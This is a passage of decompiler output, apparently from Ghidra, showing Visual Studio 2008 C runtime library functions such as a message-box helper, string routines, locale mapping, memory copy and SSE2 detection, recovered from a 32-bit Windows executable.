  if (DAT_00419b9c == 0) {
    hModule = LoadLibraryA("USER32.DLL");
    if (hModule == (HMODULE)0x0) {
      return 0;
    }
    pFVar2 = GetProcAddress(hModule,"MessageBoxA");
    if (pFVar2 == (FARPROC)0x0) {
      return 0;
    }
    DAT_00419b9c = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetActiveWindow");
    DAT_00419ba0 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetLastActivePopup");
    DAT_00419ba4 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,"GetUserObjectInformationA");
    DAT_00419bac = __encode_pointer((int)pFVar2);
    if (DAT_00419bac != 0) {
      pFVar2 = GetProcAddress(hModule,"GetProcessWindowStation");
      DAT_00419ba8 = __encode_pointer((int)pFVar2);
    }
  }
  if ((DAT_00419ba8 != iVar1) && (DAT_00419bac != iVar1)) {
    pcVar3 = (code *)__decode_pointer(DAT_00419ba8);
    pcVar4 = (code *)__decode_pointer(DAT_00419bac);
    if (((pcVar3 != (code *)0x0) && (pcVar4 != (code *)0x0)) &&
       (((iVar5 = (*pcVar3)(), iVar5 == 0 ||
         (iVar5 = (*pcVar4)(iVar5,1,local_18,0xc,local_c), iVar5 == 0)) || ((local_10 & 1) == 0))))
    {
      _UType = _UType | 0x200000;
      goto LAB_0040f854;
    }
  }
  if ((((DAT_00419ba0 != iVar1) &&
       (pcVar3 = (code *)__decode_pointer(DAT_00419ba0), pcVar3 != (code *)0x0)) &&
      (local_8 = (*pcVar3)(), local_8 != 0)) &&
     ((DAT_00419ba4 != iVar1 &&
      (pcVar3 = (code *)__decode_pointer(DAT_00419ba4), pcVar3 != (code *)0x0)))) {
    local_8 = (*pcVar3)(local_8);
  }
LAB_0040f854:
  pcVar3 = (code *)__decode_pointer(DAT_00419b9c);
  if (pcVar3 == (code *)0x0) {
    return 0;
  }
  iVar1 = (*pcVar3)(local_8,_LpText,_LpCaption,_UType);
  return iVar1;
}



// Library Function - Single Match
//  _strcat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  errno_t eVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        do {
          cVar1 = *_Src;
          *pcVar3 = cVar1;
          pcVar3 = pcVar3 + 1;
          _Src = _Src + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0040f89d;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0040f89d:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_error_mode(int _Mode)

{
  int *piVar1;
  int iVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar2 = DAT_00419498;
      DAT_00419498 = _Mode;
      return iVar2;
    }
    if (_Mode == 3) {
      return DAT_00419498;
    }
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2008 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint uVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  char *pcVar5;
  uint cchWideChar;
  undefined4 *puVar6;
  UINT UVar7;
  int *in_ECX;
  char *pcVar8;
  LPSTR lpMultiByteStr;
  void *local_14;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  if (DAT_00419bb0 == 0) {
    iVar3 = LCMapStringW(0,0x100,L"",1,(LPWSTR)0x0,0);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
      if (DVar4 == 0x78) {
        DAT_00419bb0 = 2;
      }
    }
    else {
      DAT_00419bb0 = 1;
    }
  }
  pcVar5 = (char *)param_3;
  pcVar8 = param_4;
  if (0 < (int)param_4) {
    do {
      pcVar8 = pcVar8 + -1;
      if (*pcVar5 == '\0') goto LAB_0040f9cb;
      pcVar5 = pcVar5 + 1;
    } while (pcVar8 != (char *)0x0);
    pcVar8 = (char *)0xffffffff;
LAB_0040f9cb:
    pcVar5 = param_4 + -(int)pcVar8;
    bVar2 = (int)(pcVar5 + -1) < (int)param_4;
    param_4 = pcVar5 + -1;
    if (bVar2) {
      param_4 = pcVar5;
    }
  }
  if ((DAT_00419bb0 == 2) || (DAT_00419bb0 == 0)) {
    local_10 = (undefined4 *)0x0;
    local_14 = (void *)0x0;
    if (param_1 == (localeinfo_struct *)0x0) {
      param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
    }
    if (param_7 == 0) {
      param_7 = *(int *)(*in_ECX + 4);
    }
    UVar7 = ___ansicp((LCID)param_1);
    if (UVar7 == 0xffffffff) goto LAB_0040fced;
    if (UVar7 == param_7) {
      LCMapStringA((LCID)param_1,param_2,(LPCSTR)param_3,(int)param_4,(LPSTR)param_5,(int)param_6);
    }
    else {
      local_10 = (undefined4 *)
                 ___convertcp(param_7,UVar7,(char *)param_3,(uint *)&param_4,(LPSTR)0x0,0);
      if (local_10 == (undefined4 *)0x0) goto LAB_0040fced;
      local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)0x0,0);
      if (local_c != 0) {
        if (((int)local_c < 1) || (0xffffffe0 < local_c)) {
          puVar6 = (undefined4 *)0x0;
        }
        else if (local_c + 8 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_0040fcca;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(local_c + 8);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
        if (puVar6 != (undefined4 *)0x0) {
          _memset(puVar6,0,local_c);
          local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)puVar6,
                                 local_c);
          if (local_c != 0) {
            local_14 = (void *)___convertcp(UVar7,param_7,(char *)puVar6,&local_c,(LPSTR)param_5,
                                            (int)param_6);
          }
          __freea(puVar6);
        }
      }
    }
LAB_0040fcca:
    if (local_10 != (undefined4 *)0x0) {
      _free(local_10);
    }
    if ((local_14 != (void *)0x0) && ((void *)param_5 != local_14)) {
      _free(local_14);
    }
    goto LAB_0040fced;
  }
  if (DAT_00419bb0 != 1) goto LAB_0040fced;
  local_c = 0;
  if (param_7 == 0) {
    param_7 = *(int *)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar(param_7,(uint)(param_8 != 0) * 8 + 1,(LPCSTR)param_3,
                                    (int)param_4,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_0040fced;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar1 = cchWideChar * 2 + 8;
    if (uVar1 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffdc;
      local_10 = (undefined4 *)&stack0xffffffdc;
      if (&stack0x00000000 != (undefined *)0x24) {
LAB_0040fa73:
        local_10 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar1);
      local_10 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_0040fa73;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_0040fced;
  iVar3 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,(int)param_4,(LPWSTR)local_10,cchWideChar);
  if ((iVar3 != 0) &&
     (local_c = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0),
     local_c != 0)) {
    if ((param_2 & 0x400) == 0) {
      if (((int)local_c < 1) || (0xffffffe0 / local_c < 2)) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        uVar1 = local_c * 2 + 8;
        if (uVar1 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_0040fb83;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(uVar1);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
      }
      if (puVar6 != (undefined4 *)0x0) {
        iVar3 = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar6,
                             local_c);
        if (iVar3 != 0) {
          lpMultiByteStr = (LPSTR)param_5;
          pcVar5 = param_6;
          if (param_6 == (char *)0x0) {
            lpMultiByteStr = (LPSTR)0x0;
            pcVar5 = (char *)0x0;
          }
          local_c = WideCharToMultiByte(param_7,0,(LPCWSTR)puVar6,local_c,lpMultiByteStr,(int)pcVar5
                                        ,(LPCSTR)0x0,(LPBOOL)0x0);
        }
        __freea(puVar6);
      }
    }
    else if ((param_6 != (char *)0x0) && ((int)local_c <= (int)param_6)) {
      LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)param_5,(int)param_6)
      ;
    }
  }
LAB_0040fb83:
  __freea(local_10);
LAB_0040fced:
  iVar3 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    ((localeinfo_struct *)_LocaleName,_DwMapFlag,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpDestStr,(char *)_CchDest,_Code_page,_BError,in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  BOOL BVar1;
  DWORD DVar2;
  uint cchWideChar;
  undefined4 *puVar3;
  int iVar4;
  ushort *puVar5;
  int *in_ECX;
  undefined4 *lpWideCharStr;
  void *_Memory;
  int *local_c;
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  local_c = in_ECX;
  if (DAT_00419bb4 == 0) {
    BVar1 = GetStringTypeW(1,L"",1,(LPWORD)&local_c);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x78) {
        DAT_00419bb4 = 2;
      }
      goto LAB_0040fd9f;
    }
    DAT_00419bb4 = 1;
  }
  else {
LAB_0040fd9f:
    if ((DAT_00419bb4 == 2) || (DAT_00419bb4 == 0)) {
      _Memory = (void *)0x0;
      if (param_6 == 0) {
        param_6 = *(int *)(*in_ECX + 0x14);
      }
      if (param_5 == (ushort *)0x0) {
        param_5 = *(ushort **)(*in_ECX + 4);
      }
      puVar5 = (ushort *)___ansicp(param_6);
      if ((puVar5 != (ushort *)0xffffffff) &&
         (((puVar5 == param_5 ||
           (_Memory = (void *)___convertcp((UINT)param_5,(UINT)puVar5,(char *)param_2,
                                           (uint *)&param_3,(LPSTR)0x0,0), param_2 = (ulong)_Memory,
           _Memory != (void *)0x0)) &&
          (GetStringTypeA(param_6,(DWORD)param_1,(LPCSTR)param_2,(int)param_3,(LPWORD)param_4),
          _Memory != (void *)0x0)))) {
        _free(_Memory);
      }
      goto LAB_0040feec;
    }
    if (DAT_00419bb4 != 1) goto LAB_0040feec;
  }
  local_c = (int *)0x0;
  if (param_5 == (ushort *)0x0) {
    param_5 = *(ushort **)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar((UINT)param_5,(uint)(param_7 != 0) * 8 + 1,(LPCSTR)param_2,
                                    (int)param_3,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_0040feec;
  lpWideCharStr = (undefined4 *)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar3 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_0040fe2f:
        lpWideCharStr = puVar3 + 2;
      }
    }
    else {
      puVar3 = (undefined4 *)_malloc(_Size);
      lpWideCharStr = puVar3;
      if (puVar3 != (undefined4 *)0x0) {
        *puVar3 = 0xdddd;
        goto LAB_0040fe2f;
      }
    }
  }
  if (lpWideCharStr != (undefined4 *)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar4 = MultiByteToWideChar((UINT)param_5,1,(LPCSTR)param_2,(int)param_3,(LPWSTR)lpWideCharStr,
                                cchWideChar);
    if (iVar4 != 0) {
      local_c = (int *)GetStringTypeW((DWORD)param_1,(LPCWSTR)lpWideCharStr,iVar4,(LPWORD)param_4);
    }
    __freea(lpWideCharStr);
  }
LAB_0040feec:
  iVar4 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)_DWInfoType,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpCharType,(ushort *)_Code_page,_BError,in_stack_00000020,
                     in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
    _free(param_1[0x2a]);
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_00418ec8) {
      _free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_00418ecc) {
      _free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_00418ed0) {
      _free(param_1[2]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_00418ed4) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_00418ed8) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_00418edc) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_00418ee0) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_00418ee4) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_00418ee8) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_00418eec) {
      _free(*(undefined **)(param_1 + 0x24));
    }
  }
  return;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(char *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



// Library Function - Single Match
//  _fastcopy_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastcopy_I(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  
  uVar16 = param_3 >> 7;
  do {
    uVar1 = param_2[1];
    uVar2 = param_2[2];
    uVar3 = param_2[3];
    uVar4 = param_2[4];
    uVar5 = param_2[5];
    uVar6 = param_2[6];
    uVar7 = param_2[7];
    uVar8 = param_2[8];
    uVar9 = param_2[9];
    uVar10 = param_2[10];
    uVar11 = param_2[0xb];
    uVar12 = param_2[0xc];
    uVar13 = param_2[0xd];
    uVar14 = param_2[0xe];
    uVar15 = param_2[0xf];
    *param_1 = *param_2;
    param_1[1] = uVar1;
    param_1[2] = uVar2;
    param_1[3] = uVar3;
    param_1[4] = uVar4;
    param_1[5] = uVar5;
    param_1[6] = uVar6;
    param_1[7] = uVar7;
    param_1[8] = uVar8;
    param_1[9] = uVar9;
    param_1[10] = uVar10;
    param_1[0xb] = uVar11;
    param_1[0xc] = uVar12;
    param_1[0xd] = uVar13;
    param_1[0xe] = uVar14;
    param_1[0xf] = uVar15;
    uVar1 = param_2[0x11];
    uVar2 = param_2[0x12];
    uVar3 = param_2[0x13];
    uVar4 = param_2[0x14];
    uVar5 = param_2[0x15];
    uVar6 = param_2[0x16];
    uVar7 = param_2[0x17];
    uVar8 = param_2[0x18];
    uVar9 = param_2[0x19];
    uVar10 = param_2[0x1a];
    uVar11 = param_2[0x1b];
    uVar12 = param_2[0x1c];
    uVar13 = param_2[0x1d];
    uVar14 = param_2[0x1e];
    uVar15 = param_2[0x1f];
    param_1[0x10] = param_2[0x10];
    param_1[0x11] = uVar1;
    param_1[0x12] = uVar2;
    param_1[0x13] = uVar3;
    param_1[0x14] = uVar4;
    param_1[0x15] = uVar5;
    param_1[0x16] = uVar6;
    param_1[0x17] = uVar7;
    param_1[0x18] = uVar8;
    param_1[0x19] = uVar9;
    param_1[0x1a] = uVar10;
    param_1[0x1b] = uVar11;
    param_1[0x1c] = uVar12;
    param_1[0x1d] = uVar13;
    param_1[0x1e] = uVar14;
    param_1[0x1f] = uVar15;
    param_2 = param_2 + 0x20;
    param_1 = param_1 + 0x20;
    uVar16 = uVar16 - 1;
  } while (uVar16 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined4 * __cdecl __VEC_memcpy(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined *puVar5;
  undefined4 *puVar6;
  undefined *puVar7;
  undefined4 *puVar8;
  
  uVar3 = (int)param_2 >> 0x1f;
  uVar3 = (((uint)param_2 ^ uVar3) - uVar3 & 0xf ^ uVar3) - uVar3;
  uVar4 = (int)param_1 >> 0x1f;
  uVar4 = (((uint)param_1 ^ uVar4) - uVar4 & 0xf ^ uVar4) - uVar4;
  if ((uVar3 | uVar4) == 0) {
    uVar3 = param_3 & 0x7f;
    if (param_3 != uVar3) {
      _fastcopy_I(param_1,param_2,param_3 - uVar3);
    }
    if (uVar3 != 0) {
      puVar5 = (undefined *)((int)param_2 + (param_3 - uVar3));
      puVar7 = (undefined *)((int)param_1 + (param_3 - uVar3));
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar7 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar7 = puVar7 + 1;
      }
    }
  }
  else if (uVar3 == uVar4) {
    iVar1 = 0x10 - uVar3;
    puVar6 = param_2;
    puVar8 = param_1;
    for (iVar2 = iVar1; iVar2 != 0; iVar2 = iVar2 + -1) {
      *(undefined *)puVar8 = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      puVar8 = (undefined4 *)((int)puVar8 + 1);
    }
    __VEC_memcpy((undefined4 *)((int)param_1 + iVar1),(undefined4 *)((int)param_2 + iVar1),
                 param_3 - iVar1);
  }
  else {
    puVar6 = param_1;
    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar6 = *param_2;
      param_2 = param_2 + 1;
      puVar6 = puVar6 + 1;
    }
    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar6 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    }
  }
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _has_osfxsr_set
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 _has_osfxsr_set(void)

{
  return 1;
}



// WARNING: Removing unreachable block (ram,0x00410437)
// WARNING: Removing unreachable block (ram,0x00410424)
// Library Function - Single Match
//  __get_sse2_info
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __get_sse2_info(void)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  uVar4 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | 0x40
          | (uint)(in_AF & 1) * 0x10 | 4 | (uint)(in_ID & 1) * 0x200000 |
          (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000
  ;
  uVar1 = uVar4 ^ 0x200000;
  if (((uint)((uVar1 & 0x4000) != 0) * 0x4000 | (uint)((uVar1 & 0x400) != 0) * 0x400 |
       (uint)((uVar1 & 0x200) != 0) * 0x200 | (uint)((uVar1 & 0x100) != 0) * 0x100 |
       (uint)((uVar1 & 0x40) != 0) * 0x40 | (uint)((uVar1 & 0x10) != 0) * 0x10 |
       (uint)((uVar1 & 4) != 0) * 4 | (uint)((uVar1 & 0x200000) != 0) * 0x200000 |
      (uint)((uVar1 & 0x40000) != 0) * 0x40000) != uVar4) {
    cpuid_basic_info(0);
    iVar2 = cpuid_Version_info(1);
    local_8 = *(uint *)(iVar2 + 8);
  }
  if (((local_8 & 0x4000000) == 0) || (iVar2 = _has_osfxsr_set(), iVar2 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = 1;
  }
  return uVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_00419bc0;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_00419bbc;
    do {
      piVar2 = piVar1;
      if (DAT_00419bc0 == (int *)0x0) goto LAB_004104ad;
      piVar1 = DAT_00419bc0;
    } while (*DAT_00419bc0 != *(int *)(param_1 + 4));
    piVar2[1] = DAT_00419bc0[1];
    _free(_Memory);
LAB_004104ad:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_004104d0();
  return;
}



void FUN_004104d0(void)

{
  FUN_0040a124(0xe);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  size_t sVar2;
  uint uVar3;
  size_t local_20;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
